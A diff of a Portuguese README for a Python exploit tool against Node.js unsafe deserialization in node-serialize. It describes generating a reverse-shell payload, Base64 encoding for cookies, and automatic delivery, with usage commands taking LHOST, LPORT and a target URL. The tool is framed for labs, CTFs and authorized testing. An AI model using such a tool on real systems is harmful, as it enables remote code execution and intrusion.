@@ -1,29 +1,49 @@
-# Node.js Unsafe Deserialization Payload Generator
+# 🧬 deserializer.py
 
-Este script gera payloads para exploração de vulnerabilidades de **deserialização insegura no Node.js**, especialmente em aplicações que usam a biblioteca `node-serialize`. retornando um RCE
+Ferramenta de exploração para **Node.js Deserialization (node-serialize)** com suporte à execução automatizada de payloads **Reverse Shell**.
+
+Este script foi feito para **gerar, codificar e opcionalmente enviar automaticamente** um payload malicioso para aplicações Node.js vulneráveis à deserialização. Ele suporta envio via JSON direto no corpo da requisição ou através de cookies.
+
+> ✅ Ideal para testes em ambientes controlados, labs e CTFs.  
+> ⚠️ **Uso exclusivamente educacional e autorizado!**
 
 ---
 
-## 📌 Objetivo
+## 🚀 Funcionalidades
 
-Cria entradas maliciosas que injetam funções no backend Node.js por meio de objetos serializados, resultando em **execução remota de comandos (RCE)**.
+- Geração de payload malicioso com shell reversa (`/bin/sh`) usando `node-serialize`.
+- Codificação automática em Base64 para uso em cookies.
+- Envio automático do payload com listener embutido.
+- Suporte ao envio via **JSON** ou **Cookie**.
+- Uso simples por linha de comando com parâmetros.
 
 ---
 
-## ⚙️ Funcionamento
+## 📦 Requisitos
 
-Gera uma função JavaScript (Node.js) que estabelece uma reverse shell com o atacante.
+- Python 3.6+
+- `requests` (`pip install requests`)
+- `netcat` (`nc`) instalado no sistema
 
-1 - A função é formatada com a tag especial "_$$ND_FUNC$$_", usada pela biblioteca node-serialize para interpretar funções serializadas.
+---
 
-    Constrói e exibe dois formatos de payload:
-    
-    JSON puro – para uso direto em requisições.
-    Base64 – ideal para injeção em cookies ou campos codificados.
+## 🧠 Como funciona
 
-No payload, ele gera dentro do campo "email" que pode ser alterado para o formato que a aplicação que for testada receberá!
+O script gera um payload com a tag `_$$ND_FUNC$$_`, usada em exploits de `node-serialize`, onde uma função JavaScript é deserializada e executada no backend Node.js. Ao ser executado, ele conecta ao seu IP e porta definidos, abrindo uma shell remota.
 
-## 🧪 Exemplo de uso
+---
 
-```bash
-python3 payload.py host port
+## 🛠️ Uso
+
+### Geração simples do payload
+
+    python3 deserializer.py <LHOST> <LPORT>
+
+### Envio automático já com a reverse shell + tipo de payload para cookie:
+
+    python3 deserializer.py <LHOST> <LPORT> --reverse <URL> --cookie
+
+### Envio automático já com a reverse shell + tipo de payload para json:
+
+    python3 deserializer.py <LHOST> <LPORT> --reverse <URL> --json
+
